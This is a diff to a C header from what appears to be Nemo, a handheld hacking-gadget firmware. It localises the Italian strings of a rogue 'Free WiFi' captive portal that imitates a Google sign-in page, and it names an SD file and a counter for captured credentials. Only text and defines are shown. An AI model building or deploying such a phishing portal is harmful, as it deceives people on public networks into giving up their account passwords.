@@ -3,7 +3,7 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "Nemo Free WiFi"
+#define DEFAULT_AP_SSID_NAME "Free WiFi"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT)
@@ -29,14 +29,14 @@
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
 #elif defined(LANGUAGE_IT_IT)
-#define LOGIN_TITLE "Sign in"
-#define LOGIN_SUBTITLE "Sign In With Google"
+#define LOGIN_TITLE "Accedi"
+#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
 #define LOGIN_EMAIL_PLACEHOLDER "Email"
 #define LOGIN_PASSWORD_PLACEHOLDER "Password"
-#define LOGIN_MESSAGE "Please log in to browse securely."
-#define LOGIN_BUTTON "Next"
-#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
-#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
+#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
+#define LOGIN_BUTTON "Avanti"
+#define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
+#define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
